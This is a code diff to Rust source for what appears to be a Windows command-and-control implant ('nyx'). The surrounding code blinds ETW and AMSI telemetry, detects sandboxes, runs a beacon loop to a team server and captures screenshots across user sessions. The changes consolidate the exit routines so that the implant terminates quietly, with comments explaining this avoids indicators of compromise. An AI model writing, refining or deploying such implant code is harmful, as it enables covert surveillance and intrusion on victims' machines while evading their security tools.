@@ -179,8 +179,9 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
         let all_ok = etw_r.is_ok() && nt_r.is_ok() && amsi_r.is_ok();
         crate::blind::BLIND_OK.store(all_ok, core::sync::atomic::Ordering::Release);
         if !all_ok {
+            // SAFETY: single-threaded bootstrap; written once, read-only thereafter.
             unsafe {
-                crate::blind::BLIND_ERR = etw_r.err().or(nt_r.err()).or(amsi_r.err());
+                *crate::blind::BLIND_ERR.get() = etw_r.err().or(nt_r.err()).or(amsi_r.err());
             }
         }
     } else {
@@ -258,25 +259,7 @@ pub fn csprng_fill(buf: &mut [u8]) -> bool {
 #[no_mangle]
 pub unsafe extern "system" fn nyx_entry() {
     let Some(_ntdll) = bootstrap() else {
-        // Bootstrap failed (ntll not found or sandbox detected). Exit cleanly
-        // rather than spin-looping — a 100% CPU spin is a loud IOC. Try, in
-        // order: ExitProcess → NtTerminateProcess → int3 trap. No infinite loops.
-        if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
-            let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
-            f(0xFFFF_FFFE);
-        }
-        // ExitProcess unresolved — fall back to NtTerminateProcess (ntdll).
-        core::hint::spin_loop();
-        if let Some(nt) = crate::resolve::export_addr(b"ntdll.dll", b"NtTerminateProcess") {
-            // NtTerminateProcess(Handle, Status) -> NTSTATUS. -1 = current process.
-            type NtTerminateProcess = unsafe extern "system" fn(usize, i32) -> i32;
-            let f: NtTerminateProcess = core::mem::transmute(nt);
-            f(0xFFFF_FFFF_FFFF_FFFF, 0);
-        }
-        // Last resort: int3 trap — quieter than an infinite spin loop.
-        unsafe {
-            core::arch::asm!("int3", options(noreturn));
-        }
+        exit_in_entry(0xFFFF_FFFE);
     };
     diag_mark(b"8_before_loop");
     crate::beacon::beacon_loop();
@@ -328,9 +311,15 @@ unsafe fn exit_in_entry(code: u32) -> ! {
         let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
         f(code);
     }
-    loop {
-        core::hint::spin_loop();
+    // ExitProcess unresolved — fall back to NtTerminateProcess (ntdll).
+    if let Some(nt) = crate::resolve::export_addr(b"ntdll.dll", b"NtTerminateProcess") {
+        // NtTerminateProcess(Handle, Status) -> NTSTATUS. -1 = current process.
+        type NtTerminateProcess = unsafe extern "system" fn(usize, i32) -> i32;
+        let f: NtTerminateProcess = core::mem::transmute(nt);
+        f(0xFFFF_FFFF_FFFF_FFFF, 0);
     }
+    // Last resort: int3 trap — quieter than an infinite spin loop.
+    core::arch::asm!("int3", options(noreturn));
 }
 
 #[cfg(nyx_diag)]
@@ -432,13 +421,7 @@ pub unsafe extern "system" fn nyx_beacon_oneshot() {
     };
     let code = crate::beacon::beacon_oneshot();
     // Exit with the status code so the harness can read %ERRORLEVEL%.
-    if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
-        let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
-        f(code);
-    }
-    loop {
-        core::hint::spin_loop();
-    }
+    exit_in_entry(code);
 }
 
 /// **Cross-session screenshot helper**: invoked by `CreateProcessAsUserW` inside
@@ -463,33 +446,9 @@ pub unsafe extern "system" fn nyx_screenshot_session() {
     // from one that failed to write (exit 1). The old code discarded the bool
     // and always exited 0, so a failed capture looked identical to success.
     let ok = crate::screenshot::capture_to_file(path);
-    if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
-        let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
-        f(if ok { 0 } else { 1 });
-    }
-    loop {
-        core::hint::spin_loop();
-    }
+    exit_in_entry(if ok { 0 } else { 1 });
 }
 
-/// Append `n` in decimal to `s` (no `u64::to_string` / `format!` in this crate).
-fn push_dec(s: &mut crate::heap::String, n: u64) {
-    if n == 0 {
-        s.push('0');
-        return;
-    }
-    let mut buf = [0u8; 20];
-    let mut i = buf.len();
-    let mut m = n;
-    while m > 0 {
-        i -= 1;
-        buf[i] = b'0' + (m % 10) as u8;
-        m /= 10;
-    }
-    for &b in &buf[i..] {
-        s.push(b as char);
-    }
-}
 
 /// **Screenshot cross-session test entry** (instrumented, for runtime validation
 /// without a full beacon+team-server round-trip). Runs `do_screenshot` and
@@ -533,9 +492,9 @@ pub unsafe extern "system" fn nyx_screenshot_test() {
     } else if total_bytes > 0 {
         let mut s = crate::heap::String::from("chunks=");
         // decimal-encode resp.len() and total_bytes by hand (no format!/no u32::to_string)
-        push_dec(&mut s, resp.len() as u64);
+        crate::fmt::push_decimal_u64(&mut s, resp.len() as u64);
         s.push_str(" bytes=");
-        push_dec(&mut s, total_bytes as u64);
+        crate::fmt::push_decimal_u64(&mut s, total_bytes as u64);
         s.push_str("\nOK\n");
         s
     } else {
@@ -545,13 +504,7 @@ pub unsafe extern "system" fn nyx_screenshot_test() {
         crate::screenshot::capture_diag(b"C:\\Windows\\Temp\\nyx_shot_diag.txt\0", line.as_bytes());
 
     let ok = err_str.is_none() && total_bytes > 0;
-    if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
-        let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
-        f(if ok { 0 } else { 1 });
-    }
-    loop {
-        core::hint::spin_loop();
-    }
+    exit_in_entry(if ok { 0 } else { 1 });
 }
 
 /// **Self-test entry** (benign validation). Resolves ntdll, builds the SSN
